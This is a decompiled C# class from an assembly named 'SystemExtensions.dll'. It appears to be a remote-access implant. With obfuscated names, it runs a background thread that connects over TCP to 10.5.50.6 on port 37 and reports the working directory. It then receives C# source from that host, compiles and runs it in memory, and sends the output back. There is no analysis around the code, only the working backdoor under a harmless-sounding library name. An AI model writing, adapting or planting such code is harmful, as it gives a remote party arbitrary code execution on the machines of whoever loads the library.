// Decompiled with JetBrains decompiler
// Type: Class1
// Assembly: SystemExtensions, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 0A40C0D2-CA2F-4935-A384-ADAE2A9DCBE0
// Assembly location: D:\Nyx\Server\net9.0-windows\SystemExtensions.dll

using System;
using System.CodeDom.Compiler;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Text;
using System.Threading;

#nullable disable
internal sealed class Class1
{
  internal sealed class Class0
  {
    internal static Socket socket_0;
    internal static bool bool_0 = false;
    internal static Thread thread_0;
    internal static byte[] byte_0;
    internal static string[] string_0;
    internal static string string_1;
    internal static int int_0;

    internal static void smethod_0()
    {
      if (Class1.Class0.bool_0)
        return;
      Class1.Class0.bool_0 = true;
      Class1.Class0.int_0 = 0;
      Class1.Class0.byte_0 = new byte[(int) ushort.MaxValue];
      Class1.Class0.thread_0 = new Thread(new ThreadStart(Class1.Class0.smethod_1));
      Class1.Class0.thread_0.Start();
    }

    internal static void smethod_1()
    {
      while (true)
      {
        try
        {
          if (Class1.Class0.socket_0 == null)
          {
            Class1.Class0.socket_0 = Class1.Class0.smethod_2();
            if (Class1.Class0.socket_0 != null)
            {
              Class1.Class0.int_0 = 0;
              Class1.Class0.smethod_6((object) Environment.CurrentDirectory);
            }
          }
          else
          {
            ++Class1.Class0.int_0;
            if (!Class1.Class0.socket_0.Connected || Class1.Class0.int_0 > 3600)
            {
              Class1.Class0.socket_0.Close();
              Class1.Class0.socket_0 = (Socket) null;
            }
            else
            {
              bool flag = false;
              try
              {
                Class1.Class0.smethod_5();
              }
              catch (Exception ex)
              {
                Class1.Class0.smethod_6((object) ex.ToString());
                flag = true;
              }
              if (!flag)
              {
                try
                {
                  Class1.Class0.smethod_4();
                }
                catch (Exception ex)
                {
                  Class1.Class0.smethod_6((object) ex.ToString());
                }
              }
            }
          }
        }
        catch
        {
        }
        Thread.Sleep(1000);
      }
    }

    internal static Socket smethod_2()
    {
      return Class1.Class0.smethod_3("10.5.50.6") ?? Class1.Class0.smethod_3("10.5.50.6");
    }

    internal static Socket smethod_3(string string_2)
    {
      Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
      IPHostEntry hostEntry = Dns.GetHostEntry(string_2);
      return !socket.BeginConnect(hostEntry.AddressList, 37, (AsyncCallback) null, (object) null).AsyncWaitHandle.WaitOne(5000, true) ? (Socket) null : socket;
    }

    internal static void smethod_4()
    {
      using (CodeDomProvider provider = CodeDomProvider.CreateProvider("CSharp"))
      {
        CompilerResults compilerResults = provider.CompileAssemblyFromSource(new CompilerParameters(Class1.Class0.string_0)
        {
          GenerateExecutable = false,
          GenerateInMemory = true
        }, Class1.Class0.string_1);
        if (compilerResults.Errors.Count == 0)
        {
          Type type = compilerResults.CompiledAssembly.GetType("Main");
          if (type == (Type) null)
          {
            Class1.Class0.smethod_6((object) "Missing main class: 'Main'");
          }
          else
          {
            MethodInfo method = type.GetMethod("Run", BindingFlags.Static | BindingFlags.Public);
            if (method == (MethodInfo) null)
              Class1.Class0.smethod_6((object) "Missing main method: 'Run'");
            else
              Class1.Class0.smethod_6(method.Invoke((object) null, (object[]) null));
          }
        }
        else
        {
          StringBuilder stringBuilder = new StringBuilder();
          foreach (CompilerError error in (CollectionBase) compilerResults.Errors)
            stringBuilder.Append("Line ").Append(error.Line).Append(", Error number: ").Append(error.ErrorNumber).Append("; ").Append(error.ErrorText).AppendLine();
          Class1.Class0.smethod_6((object) stringBuilder.ToString());
        }
      }
    }

    internal static void smethod_5()
    {
      List<byte> source = new List<byte>();
      int num = 0;
      while (source.Count < 4)
      {
        int count = Class1.Class0.socket_0.Receive(Class1.Class0.byte_0);
        source.AddRange(((IEnumerable<byte>) Class1.Class0.byte_0).Take<byte>(count));
      }
      int int32 = BitConverter.ToInt32(source.Take<byte>(4).ToArray<byte>(), 0);
      while (source.Count < int32)
      {
        int count = Class1.Class0.socket_0.Receive(Class1.Class0.byte_0);
        source.AddRange(((IEnumerable<byte>) Class1.Class0.byte_0).Take<byte>(count));
      }
      using (BinaryReader binaryReader = new BinaryReader((Stream) new MemoryStream(source.ToArray()), Encoding.ASCII))
      {
        num = binaryReader.ReadInt32();
        int length = binaryReader.ReadInt32();
        Class1.Class0.string_0 = new string[length];
        for (int index = 0; index < length; ++index)
          Class1.Class0.string_0[index] = binaryReader.ReadString();
        Class1.Class0.string_1 = binaryReader.ReadString();
      }
    }

    internal static void smethod_6(object object_0)
    {
      if (object_0 == null)
        object_0 = (object) string.Empty;
      using (MemoryStream output = new MemoryStream())
      {
        using (BinaryWriter binaryWriter = new BinaryWriter((Stream) output))
        {
          binaryWriter.Write(0);
          binaryWriter.Write(object_0.ToString());
          binaryWriter.BaseStream.Position = 0L;
          binaryWriter.Write((int) binaryWriter.BaseStream.Length);
          Class1.Class0.socket_0.Send(output.ToArray());
        }
      }
    }
  }
}
